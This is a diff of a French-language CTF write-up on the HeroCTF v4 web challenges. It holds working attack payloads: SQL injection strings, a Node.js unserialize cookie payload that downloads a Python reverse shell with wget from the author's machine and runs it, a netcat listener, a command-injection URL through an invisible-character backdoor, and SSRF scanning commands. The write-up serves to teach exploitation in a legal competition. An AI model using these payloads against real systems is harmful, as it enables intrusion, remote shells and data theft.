@@ -1,14 +1,19 @@
 # Web HeroCTF v4
 
 Hey, ici tu trouveras mes write-ups des challenges webs du HeroCTF v4, j'ai particulièrement aimé cette compétition avec la Medus'Hack (et Bleubytes avec le boss SeulAParis). 
+
 J'ai rédigé tout cela après avoir flag les épreuves (je rédige dans l'ordre auquel je les ai flag), je vais essayer de vous montrer ma réflexion et ma méthodo pour vous montrer également mes tentatives d'exploit et pistes (avec ou sans succès).
 
 # SmallBigMistake
 
 **Description**: The website developer made a small mistake in the code of his website. Can you identify and exploit it to extract the flag?
+
 **URL**: [https://smallbigmistake.web.heroctf.fr](https://smallbigmistake.web.heroctf.fr)
+
 **Auteur** : *xanhacks*
+
 **Pièce jointe**: 
+
 ```python
 #!/usr/bin/env python
 from flask import Flask, session, render_template
@@ -37,9 +42,12 @@ if __name__ == "__main__":
 
 
 En lisant le code source, on s'aperçoit rapidement qu'il faut avoir une session contenant "admin" dans son champs "username" pour pouvoir obtenir le flag.
+
 Un détail du code nous interpelle rapidement:
 ```app.secret_key = choice(hexdigits) * 32```
+
 Le secret utilisé pour les sessions est douteusement initialisé. En effet, choice est une fonction permettant de sélectionner aléatoirement un élément d'un tableau. Le tableau hexdigits est composé de: 0123456789abcdefABCDEF, soit 22 possibilités.
+
 Le caractère sélectionné est ensuite répété 32 fois pour donner le secret.
 
 Pour attaquer, rien de bien compliqué, on va réimplémenter en python de quoi créer le cookie de session, et on va tenter les 22 possibilités sur le site.
@@ -85,10 +93,13 @@ On a obtient le flag: Hero{Sm4ll_Mist4ke_c4n_be_d4ngerous_10853085}
 ## $ where backdoor
 
 **Description**: These web masters are trying to show off their skills. But in reality, there are kind of lazy. They left a backdoor on the server for them to do some maintenance. Find it, exploit it :)
+
 **URL**: [https://wherebackdoor.web.heroctf.fr](https://wherebackdoor.web.heroctf.fr)
+
 **Auteur** : *Log_s*
 
 On se rend sur le site et on regarde tout de suite le code source HTML, ça à l'air d'être une landing page classique, on lit un peu le contenu et elle propose des fonctionnalités plutôt atypiques.
+
 On peut télécharger le code source en plus, c'est royal ! 
 
 On s'intéresse au server.js:
@@ -176,15 +187,19 @@ app.listen(3000);
 ```
 Tout de suite, je remarque un caractère invisible (mon IDE le surligne) sur l'endpoint /server_health.
 
-A peine quelques semaines auparavant, j'ai pu ragé sur cette même backdoor à un challenge du FCSC, j'avais lu le write-up, en effet, on peut inclure un caractère invisible qui est: **\u3164** et l'utiliser en tant que paramètre puis l'exécuter. On voit bien qu'il est récupéré en tant que paramètre de req.query, et qu'il est ensuite ajouté aux commandes exécutées.
-Nous pouvons donc exécuter des commandes avec par exemple: https://wherebackdoor.web.heroctf.fr/server_health?%E3%85%A4=cat /*.txt
+A peine quelques semaines auparavant, j'ai pu rager sur cette même backdoor à un challenge du FCSC, j'avais lu le write-up, en effet, on peut inclure un caractère invisible qui est: **\u3164** et l'utiliser en tant que paramètre puis l'exécuter. On voit bien qu'il est récupéré en tant que paramètre de req.query, et qu'il est ensuite ajouté aux commandes exécutées.
+
+Nous pouvons donc exécuter des commandes avec par exemple: /server_health?%E3%85%A4=cat /*.txt
 
 On obtient le flag: Hero{1nv1s1b1e_b4ckd0or_w7f}.
 
 ## Hero 1
+
 **Description**: Pre-sales are available for the HeroCTF 5 edition. Unfortunately you saw this too late and there is a 7 days wait in the queue with only 3 days left to order...
 It's up to you to figure out how to get past this line...
+
 **URL**: [https://chall.heroctf.fr:PORT/](https://chall.heroctf.fr:PORT/)
+
 **Auteur** : *Worty*
 
 On arrive sur une page avec un register et un login. Je me créé un compte et m'y connecte. J'essaye en même temps avec burp de vérifier s'il n'y a pas de comportement inattendu, notamment avec les caractères **'**, **"**, **{**. J'essaye également de passer les paramètres en Array pour déclencher une erreur. 
@@ -216,10 +231,13 @@ Il y a une communication avec un websocket pour afficher le décompte et ça m'i
         },3000)
 ```
 Je peux directement interagir avec ce websocket dans la console, en écrivant par exemple : ``ws.send('update/100')``
+
 Bien sûr, ça ne fonctionne pas. J'essaye de déclencher un comportement inattendu. Effectivement quand on envoie: ``ws.send("update/'")`` ça crash.
 
 Ca sent la SQLI à plein nez, cependant c'est dans un websocket et il a l'air de vérifier l'origine...
+
 Au bout de quelques payloads, je détermine que la base de donnée est en SQLITE.
+
 Ma payload est la suivante pour avoir une error based, en gros si la requête ne fonctionne pas, elle déclenche une erreur: 
 ``ws.send("update/' and case when (select sqlite_version() like '%') then 1 else load_extension(1) end--")``
 
@@ -285,17 +303,18 @@ Il y a deux tables: users et queue.
 
 Structure de users
 
-|                |alias                         |password                          |canaccessform                         |
-|----------------|-------------------------------|-------------------------------|-----------------------------|
+|alias                         |password                          |canaccessform                         |
+|-------------------------------|-------------------------------|-----------------------------|
 
 Structure de queue
 
-|            |uuid      | origin     | associateuser   | lastupdate    | p3rc3nt4g30fus3r| numberofrequest|
-|-----|-------------|-------------|-------------------|------------|-------------------|-----------|
+|uuid      | origin     | associateuser   | lastupdate    | p3rc3nt4g30fus3r| numberofrequest|
+|----------|-------------|-------------------|------------|-------------------|-----------|
 
 Malheureusement, il semble que je sois le seul compte présent dans la base de données. Il faut donc que je parvienne à modifier mon pourcentage, vu le mal que s'est donné worty, il fallait bien récupérer le nom de la colonne. 
 
 En réfléchissant un peu (j'ai mis du temps !), on s'aperçoit que nous sommes dans une requêtes UPDATE déjà, donc on peut modifier notre pourcentage directement ! 
+
 La payload est la suivante: 
 ``ws.send("update/', p3rc3nt4g30fus3r=100;--")``
 
@@ -307,14 +326,19 @@ Hero{sql1_0v3r_w3bs0ck3t_1s_fun}
 
 **Description**: Ooof you got your place ! GG !
 As this is not secure, there might be others things to find...
+
 **URL**: [https://chall.heroctf.fr:PORT/](https://chall.heroctf.fr:PORT/)
+
 **Auteur** : *Worty*
 
 Nous avons une page avec un magnifique formulaire qui comporte un champs pour une email, et un checkbox pour un status, soit pro, soit étudiant. Il y a un troisième champs (commentaire) qui n'est même pas envoyé.
+
 Lorsque l'on soumet le formulaire, on nous dit qu'on peut le visualiser sur /myform ! On voit bien nos données précédemment renseignées au format JSON.
 
 On est toujours redirigés vers myform, c'est chiant, donc je veux supprimer mon cookie de session, au lieu de ça, je tombe sur un cookie completedForm qui contient nos données en base64 ! Par exemple: ``eyJlbWFpbCI6Im9raWRhYyIsInN0YXR1cyI6InN0dWRlbnQifQ`` pour ``{"email":"okidac","status":"student"}``
+
 Dans les headers des réponses HTTP, on peut voir: ``X-Powered-By: Express``
+
 Très intéressant !! Ca sent la vuln unserialize à plein nez ! Je vous laisse dork pour trouver des documentations / explications sur la vuln en tant que telle.
 
 Je dork rapidement pour trouver un POC fonctionnel et je l'adapte à nos données. Je vais devoir faire un reverse shell, ou une exfiltration de données. Je choisis le reverse shell.
@@ -329,13 +353,18 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"]);
 ```
+
 Ensuite j'ouvre un serveur http simple avec python pour pouvoir le télécharger avec ma victime: 
 ``python3 -m http.server 1338``
-Je lance également une écoute sur le port 1339 pour recevoir le shell:
-``nc -lvp 1338``
+
+Je lance également une écoute sur le port 1337 pour recevoir le shell:
+``nc -lvp 1337``
+
 Plus qu'à faire une payload qui va dans /tmp, télécharge mon reverse shell et l'exécute:
 ``{"status":"okidac","email":"_$$ND_FUNC$$_function (){require('child_process').exec('cd /tmp; wget http://MONIP:1337/shell.py; python3 shell.py', function(error, stdout, stderr){});}()"}``
+
 Je la mets en base64 et en cookie et je prie pour que python3 soit installé, sinon plus qu'à trouver un autre moyen ou lancer un binaire:
+
 Ma payload en base 64: ``eyJzdGF0dXMiOiJva2lkYWMiLCJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY2QgL3RtcDsgd2dldCBodHRwOi8vTU9JUDoxMzM3L3NoZWxsLnB5OyBweXRob24zIHNoZWxsLnB5JywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKXt9KTt9KCkifQ==``
 
 On actualise et tada ! ``Connection from 139-177-182-251.ip.linodeusercontent.com 57220 received!``
@@ -345,7 +374,9 @@ Plus qu'à cat /flag.txt => Hero{uns3r14l1z3_sh0uld_n3v3r_b3_trust3d}
 ## Blackcat
 
 **Description**: You have heard about a new event that will take place in a secret location. At this event, there doesn't seem to be any legal conferences, and it seems to gather black hat. Find a way to get the location of this conference before the deadline.
+
 **URL**: [https://blackcat.web.heroctf.fr](https://blackcat.web.heroctf.fr)
+
 **Auteur** : *Worty*
 
 Voilà on arrive sur les challenges qui m'ont fait rager. Blackcat mérite amplement sa place dans cette catégorie.
@@ -369,7 +400,9 @@ On a une réponse même :
 L'endpoint de check ne me permet pas d'avoir plus d'information, sauf sur le fait qu'il y a une valeur secrète qui m'empêche d'énumerer les mails ...
 
 J'essaye donc de jouer sur le paramètre en array de l'endpoint /api/newsletter.php, ça ne fonctionne pas, mais une single quote ('), provoque une erreur ! Encore une SQLI ... J'essaye plusieurs payloads dans le but de ne pas déclencher d'erreur mais j'échoue. (De base j'avais commencé ce chall qui m'a fait rage quit pour aller faire du web3, mais on s'en branle de ma vie). 
+
 J'ai ensuite compris que j'étais un mongole et que si ma payload ne passait pas, c'était parce-que j'étais dans un INSERT .... '
+
 J'obtiens quelque chose dans ce style: ``MONEMAIL','okok');`--``
 En me rendant sur https://blackcat.web.heroctf.fr/api/check.php?email=MONEMAIL&secret=okok, je constate que j'ai en effet pu écrire mon secret car ça fonctionne !
 
@@ -424,14 +457,16 @@ exit(1)
 Petite subtilité, pour ne pas avoir d'erreur alors que ma requête passe, j'ajoute un nombre aléatoire dans mon email. Si on essaye d'ajouter une email qui existe déjà ça crash sinon...
 
 J'obtiens comme base de données: blackcat, et une seule table: newsletter.
+
 Structure de newsletter
 
-|                |email                          |secret                          |send_date                         |
-|----------------|-------------------------------|-------------------------------|-----------------------------|
+|email                          |secret                          |send_date                         |
+|-------------------------------|-------------------------------|-----------------------------|
 
 J'ai essayé de faire une error based pour exfiltrer des données de newsletter. Malheureusement aucun SELECT sur newsletter ne fonctionnait .... Même un test simple de ``SELECT sleep(5) from newsletter`` par exemple.
 
 Finalement j'ai compris qu'il fallait plutôt qu'on modifie notre send_date, pour cela, si on peut faire plusieurs requêtes SQL d'affilées (MULTI-STATEMENT), alors on peut insérer nos propres données dans newsletter librement.
+
 J'ai donc fait ce script et testé avec des dates sous plusieurs formats (et plusieurs dates futures):
 ```python
 email = f"ahahah{random.randint(0,1000000000)}"
@@ -453,28 +488,38 @@ We are glad that you participate at this very hidden conference !<br>Conferences
 
 **Description**: You are mandated to pentest this new CDN solution. To prove your exploitation, the company claims that it is impossible for you to reveal the name of its general manager, who is supposed to remain secret. It's up to you to find him.
 PS: Smart bruteforce might be allowed
+
 **Hint**: Errors can gives you a lot of informations of the current state of the web server !
+
 **URL**: [https://flowercdn.web.heroctf.fr](https://flowercdn.web.heroctf.fr)
+
 **Auteur** : *Worty*
 
 Le voilà, très certainement le challenge qui m'a le plus fait rager, j'ai crié au guessing, je l'ai insulté mais finalement, il était incroyable, un grand merci à Worty qui est clairement dans le futur !
 
 Tout d'abord, on tombe sur un site visuellement joli. On peut créer un compte ou se connecter. J'ai essayé de déclencher une erreur avec des quotes etc pour vérifier qu'il n'y avait pas de SQLI. Rien. Ensuite j'ai passé les paramètres en Array pour déclencher des erreurs. Bingo !
+
 On apprend que le mot de passe est en md5, qu'il y a des htmlspecialchars sur les user inputs et on a ces deux paths: 
+
 /var/www/html/api/accounts/login.php
+
 /var/www/html/api/accounts/register.php
 
 Bref, on continue et on se connecte.
+
 On est sur un site qui permet d'héberger des images. 
+
 On a une fonctionnalité de logout, qui ne semble pas vulnérable.
 
 Il y a un endpoint qui récupère les images au format json, c'est /user/data/get, il prend un paramètre size. J'ai essayé de déclencher une erreur mais rien de concluant, il semble que ce soit une variable qui limite le compteur dans une boucle par exemple.
+
 Le format json renvoyé est le suivant:
 ```json
 {"0":{"id":"1287","0":"1287","link_to_img":"\/assets\/users\/jpg\/5rh80ei0kNc6Wix.jpg","1":"\/assets\/users\/jpg\/5rh80ei0kNc6Wix.jpg"},"1":{"id":"1288","0":"1288","link_to_img":"\/assets\/users\/jpg\/5Ut7ubVbuCXmyYK.jpg","1":"\/assets\/users\/jpg\/5Ut7ubVbuCXmyYK.jpg"},"2":{"id":"1290","0":"1290","link_to_img":"\/assets\/users\/jpg\/XrUfSWPrhQ5M4TX.jpg","1":"\/assets\/users\/jpg\/XrUfSWPrhQ5M4TX.jpg"},"host":"flowercdn.web.heroctf.fr"}
 ```
 
 Un utilisateur peut également ajouter une image, soit via une URL, soit en l'uploadant. L'endpoint /user/data/new est call en POST avec en argument l'url si c'est une URL ou le fichier en multimedia part si c'est un upload.
+
 J'ai encore une fois essayé de déclencher une erreur, en passant une URL inexistante comme http://x, on apprend que la fonction file_get_contents est utilisée !
 ```
 <br />
@@ -491,6 +536,7 @@ Je fais différents tests qui me permettent de connaître ces conditions:
 - l'url doit être accessible
 
 On ne peut donc pas utiliser des wrappers pour de l'arbitrary file reading, de toute façon nous n'aurons aucun retour si ce n'est pas une image ... J'ai réfléchi au moyen de faire upload un fichier avec une extension en .php, étant une image avec du code PHP dans les headers, pour pouvoir ensuite me rendre dessus et avoir une exécution de code.
+
 Cependant, les images téléchargées sont renommées aléatoirement, et l'extension est bien écrite.
 
 J'ai ensuite essayé d'attaquer la fonctionnalité d'upload, notamment en passant un null byte pour ajouter une extension PHP, même échec. J'étais à court d'idées.
@@ -510,10 +556,13 @@ Ca m'a notamment permis de connaître d'autres paths comme:
 /var/www/html/api/user/get_data.php
 ```
 et un fichier de template sur /templates/header.html de mémoire.
+
 Il y avait également un endpoint /server-status mais le code d'erreur me montrait qu'il ne fallait pas y prêter attention. Il y avait aussi un robots.txt mais inutile.
 
 Bref j'ai commencé à rager sec à partir de ce moment là. Heureusement, du sang neuf est venu me soutenir, Itarow. Il m'a demandé pourquoi je n'énumérais pas le réseau local, effectivement pourquoi pas ! SSRF goes brrr...
+
 J'ai utilisé wfuzz et je fournissais comme url des IPs internes, j'ai pu énumerer des IP accessibles et des ports (et aussi défoncer l'infra en tapant la gateway en .1, pourquoi ? Bonne question mais c'était drôle).
+
 La commande utilisée est la suivante
 ```bash 
 wfuzz -z range,2-200 -z range,1-6000 -b PHPSESSID=b66f9b93043e0ea5998b486206739ae8 -d "url=http://172.25.0.FUZZ:FUZ2Z/" --ss "true" https://flowercdn.web.heroctf.fr/user/data/new
@@ -533,6 +582,7 @@ Le virtualhost de base était small big mistake, donc un des deux endpoints ici 
 Après encore beaucoup de haine et de pleurs, j'ai par hasard décidé de me rendre sur /server-status de Flower CDN. J'ai alors eu un message d'erreur me dévoilant le nom de domaine en local qui était flowercdn.hero ! Bingooo ! 
 
 Je m'empresse de l'ajouter à mon /etc/hosts en le faisant pointer sur l'IP de Flower CDN. Et pas bingo ! Ca me met bien Flower CDN et rien de plus....
+
 J'ai repensé au hint: "bruteforce intelligent", j'ai alors essayé subfinder sur l'hote, mais forcément je n'ai pas défini tous les sous-domaines possibles dans mon /etc/hosts, alors ça ne peut pas fonctionner...
 
 Mais on peut soi-même tenter un sous-domaine par exemple avec curl, en requetant directement sur l'IP et en fournissant dans le header Host notre nom de domaine. J'ai alors téléchargé une liste de sous-domaines pour énumérer avec wfuzz.
@@ -549,10 +599,12 @@ ID   Response   Lines      Word         Chars          Payload
 002486:  C=401     14 L       54 W          475 Ch        "documentation"
 ```
 Il existe un magnifique endpoint: documentation.flowercdn.hero ! Qui correspond certainement à notre IP locale inconnue.
+
 J'ajoute ça à mon /etc/hosts du coup et je me rend dessus !
 
 AH, une basic auth !! Je tente admin en username et admin en password.
 Ca passe !!!
+
 Et là super, j'ai une magnifique "documentation" d'une API interne.
 ```
 This API is used to search for people in our company:
@@ -644,6 +696,7 @@ def blind(exfiltrated):
 blind('')
 ```
 On parvient à exfilter: Dominique en name et Lavigne en surname !
+
 Ce qui nous donne Hero{Dominique:Lavigne}
 
 ### Pour y voir un peu plus clair sur le challenge, voici un petit diagramme:
